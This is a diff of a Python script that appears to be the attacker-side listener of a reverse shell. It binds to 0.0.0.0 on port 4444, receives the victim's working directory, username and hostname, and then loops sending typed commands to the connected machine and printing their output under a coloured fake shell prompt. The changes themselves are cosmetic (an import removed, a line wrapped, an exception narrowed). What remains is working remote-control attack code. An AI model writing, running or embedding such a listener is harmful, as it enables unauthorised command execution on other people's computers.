@@ -1,5 +1,5 @@
 import socket
-from prettyprinter import cpprint
+
 
 class bcolors:
     black = "\u001b[30m"
@@ -13,6 +13,7 @@ class bcolors:
     bold = "\u001b[1m"
     underline = "\u001b[4m"
     reset = "\u001b[0m"
+
 
 SERVER_HOST = "0.0.0.0"
 SERVER_PORT = 4444
@@ -33,7 +34,8 @@ cwd, username, hostname = message.split(SEPARATOR)
 print("[+] Current working directory:", cwd)
 
 while True:
-    prompt = f"{bcolors.bold}{bcolors.cyan}//dev-{bcolors.green}{username}@{hostname}{bcolors.white}:{bcolors.blue}{cwd}{bcolors.white}{bcolors.reset}$"
+    prompt = f"{bcolors.bold}{bcolors.cyan}//dev-{bcolors.green}{username}@{hostname}\
+        {bcolors.white}:{bcolors.blue}{cwd}{bcolors.white}{bcolors.reset}$"
     command = input(prompt)
     if not command.strip():
         continue
@@ -43,6 +45,7 @@ while True:
     output = client_socket.recv(BUFFER_SIZE).decode()
     try:
         results, cwd = output.split(SEPARATOR)
-    except:
+    except IndexError as e:
+        print(e)
         results = output
     print(results)
